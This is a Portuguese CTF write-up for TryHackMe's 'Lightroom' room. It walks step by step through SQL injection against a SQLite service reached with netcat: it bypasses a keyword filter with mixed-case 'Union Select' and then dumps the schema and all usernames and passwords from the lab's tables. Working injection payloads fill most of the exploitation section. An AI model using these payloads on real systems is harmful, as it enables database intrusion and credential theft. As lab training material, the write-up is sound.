# Lightroom Writeup

> [!NOTE] 
> **[EN]** This version of the writeup is in portuguese. Click [here]() or follow [this link (github)]() to go to the english version.

> **Link para o desafio CTF**: [https://tryhackme.com/room/lightroom](https://tryhackme.com/room/lightroom)
> 
> **Dificuldade:** `Fácil`
> 
> **Data de Resolução:** `2026/07/01`
## Sumário

> Link do writeup no github: [https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Lightroom/(PT-BR)%20Lightroom%20Writeup.md](https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/Lightroom/(PT-BR)%20Lightroom%20Writeup.md)

- [Ferramentas Utilizadas](#ferramentas%20utilizadas)
- [Resolução do CTF](#Resolução%20do%20CTF)
	1. [Reconhecimento](#Reconhecimento)
	2. [Exploração](#Exploração)
- [Conclusão](#Conclusão)
- [Referências](#Referências)
## Ferramentas Utilizadas

Para este CTF, foi utilizada a seguinte ferramenta:
- [Netcat](http://www.stearns.org/nc/)[^netcat]: programa básico de Unix responsável por ler e escrever dados através de conexões de rede. Em um contexto de pentesting, o netcat é uma ótima ferramenta para criar conexões com os sistemas na rede e ter acesso a eles de forma remota, permitindo técnicas como a de reverse shell, muito importante também nos contextos de CTF.

## Resolução do CTF

O CTF Lightroom, disponível no TryHackMe, é um desafio de dificuldade fácil que requer a exploração de um banco de dados para achar informações do sistema e a flag. Neste CTF foi necessário usar técnicas de SQLinjection. 

Após conectar-me ao VPN do TryHackMe, obtive acesso à maquina e iniciei o desafio. A estratégia usada foi dividida em duas partes (já que não há escalação de privilégios):

1. [Reconhecimento](#Reconhecimento)
2. [Exploração](#Exploração)

Para facilitar a entrada de argumentos, adicionei ao `etc/hosts` uma relação entre o IP da máquina vulnerável com um nome de domínio (`vul.net`). Com tudo preparado, comecei o reconhecimento.

### Reconhecimento

A página do CTF já indicava que o serviço do banco de dados estava na porta `1337` e que a conexão deveria ser feita via `netcat`[^netcat]:

```sh
netcat vul.net 1337
Welcome to the Light database!
Please enter your username: 
```

A primeira coisa a testar era o usuário `smokey`, indicado pelo desafio:

```
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Certo, parece que está sendo feita uma requisição SQL em que, dado um nome de usuário. Seria possível então fazer SQLinjection? Testei fechar as aspas do pedido SQL:

```
Please enter your username: smokey'
Error: unrecognized token: "'smokey'' LIMIT 30"
```

O erro acima termina com "LIMIT 30", o que poderia ser o final do pedido. Dado que apenas é retornada uma senha, supus que o pedido poderia ser algo como:

```sql
SELECT password FROM <table> WHERE username = 'user' LIMIT 30;
```

Testando entradas para uma injeção de SQL, testei usar os comandos SELECT e UNION, mas foram rejeitados. Porém, ao misturar letras maiúsculas e minúsculas, o resultado foi diferente:

```
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
Please enter your username: UNION
Ahh there is a word in there I don't like :(
Please enter your username: Select
Username not found.
Please enter your username: Union
Username not found.
```

Com isso, era possível identificar o banco de dados sendo utilizado. Com informações externas ao CTF (passadas pelo professor), eu já sabia que se tratava de um sistema baseado em SQLite. Mesmo assim, para conferir, bastou usar a seguinte entrada:

```
'Union Select sqlite_version()'
```

Dessa forma o pedido ficaria como:

```sql
SELECT password FROM <table> WHERE username = ''Union Select sqlite_version()'' LIMIT 30;
```

Realmente, isso funcionou, retornando a versão do SQLite:

```
Please enter your username: 'Union Select sqlite_version()'
Password: 3.31.1
```

Seria possível testar com outros comandos, outros tipos de bancos de dados, como para o PostgrSQL:

```
Please enter your username: 'Union Select version()'
Error: no such function: version
```

E é possível conferir que não funciona, ou seja, dá para garantir que o sistema se baseia em SQLite. Com essa informação em mãos, é possível explorar o sistema.
### Exploração

O SQLite possui uma tabela que contém o esquema do banco de dados, chamada `sqlite_master`. Usando `COUNT`, é possível saber quantas tabelas têm no sistema:

```
Please enter your username: 'Union Select COUNT(*) FROM sqlite_master WHERE type='table
Password: 2
```

Certo, há duas tabelas. A estrutura da tabela `sqlite_master` é a seguinte:

```sql
CREATE TABLE sqlite_master(
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);
```

Usando a instrução `GROUP_CONCAT`, é possível concatenar todas as informações de uma coluna como uma única informação para retornar. Isso é útil nesse contexto do CTF, pois apenas é retornado um item por vez. Assim, fazendo:

```
'Union Select GROUP_CONCAT(name) FROM sqlite_master WHERE type='table
```

Foi possível descobrir os nomes das tabelas:

```
Please enter your username: 'Union Select GROUP_CONCAT(name) FROM sqlite_master WHERE type='table
Password: usertable,admintable
```

As duas tabelas são `usertable` e `admintable`. É possível obter a estrutura de cada uma delas, fazendo:

```
'Union Select sql FROM sqlite_master WHERE type='table' AND name='<tablename>
```

Assim, as tabelas têm as seguintes estruturas:

```
Please enter your username: 'Union Select sql FROM sqlite_master WHERE type='table' AND name='usertable 
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)

Please enter your username: 'Union Select sql FROM sqlite_master WHERE type='table' AND name='admintable
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

Por fim, podemos fazer o dump de todas as informações dessas tabelas. Com `GROUP_CONCAT(username)` e `GROUP_CONCAT(password)` para cada tabela, obtemos:

```
Please enter your username: 'Union Select group_concat(username) FROM usertable '
Password: alice,rob,john,michael,smokey,hazel,ralph,steve

Please enter your username: 'Union Select group_concat(password) FROM usertable '
Password: tF8tj2o94WE4LKC,yAn4fPaF2qpCKpR,e74tqwRh2oApPo6,7DV4dwA0g5FacRe,vYQ5ngPpw8AdUmL,EcSuU35WlVipjXG,YO1U9O1m52aJImA,WObjufHX1foR8d7

Please enter your username: 'Union Select group_concat(username) FROM admintable '
Password: <ADMIN_USER>,flag

Please enter your username: 'Union Select group_concat(password) FROM admintable '
Password: <ADMIN_PASSWORD>,<FLAG>

```

Tendo todas as informações de todas as tabelas, consegui obter os dados que o CTF pedia e finalizei o CTF.
## Conclusão

O CTF Lightroom, apesar de simples, permitiu entender melhor como que são feitos ataques por injeção de SQL. Após identificar o tipo do serviço do banco de dados, foi possível extrair a estrutura completa do banco de dados e encontrar todas as informações pedidas pelo CTF.
## Referências

[^netcat]: Netcat: [http://www.stearns.org/nc/](http://www.stearns.org/nc/)




